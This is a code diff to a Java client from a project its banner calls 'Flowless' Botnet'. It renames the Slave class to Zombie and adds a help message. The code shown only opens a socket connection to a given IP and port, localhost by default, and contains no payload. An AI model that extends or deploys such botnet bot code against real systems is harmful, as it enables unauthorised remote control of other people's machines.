@@ -13,7 +13,7 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Base64;
 
-public class Slave
+public class Zombie
 {
 
   Socket sock;
@@ -22,7 +22,7 @@ public class Slave
   PrintWriter out;
   BufferedReader in;
 
-  Slave(String ipaddress, int targetPort)
+  Zombie(String ipaddress, int targetPort)
   {
       ip_addr = ipaddress;
       port = targetPort;
@@ -31,9 +31,12 @@ public class Slave
   public static void main(String[] args) throws IOException, InterruptedException {
     // Default target is localhost
     System.out.println("-------------------------------");
-    System.out.println("| Flowless' Botnet --- Slave  |");
+    System.out.println("| Flowless' Botnet --- Zombie  |");
     System.out.println("|         Version 1.0         |");
     System.out.println("-------------------------------");
+    if (args.length > 0 && args[0].equals("--help")) {
+      System.out.println("USAGE: java Zombie [ip_addr] [port]");
+    }
     String ip = "127.0.0.1";
     int port = 8888;
     // If anything else given, assign that IP address instead
@@ -45,7 +48,7 @@ public class Slave
       port = Integer.parseInt(args[1]);
     }
     // Instantiate the sender
-    Slave sender = new Slave(ip, port);
+    Zombie sender = new Zombie(ip, port);
     // Connection made
     if (!sender.Connect()) {
       return;
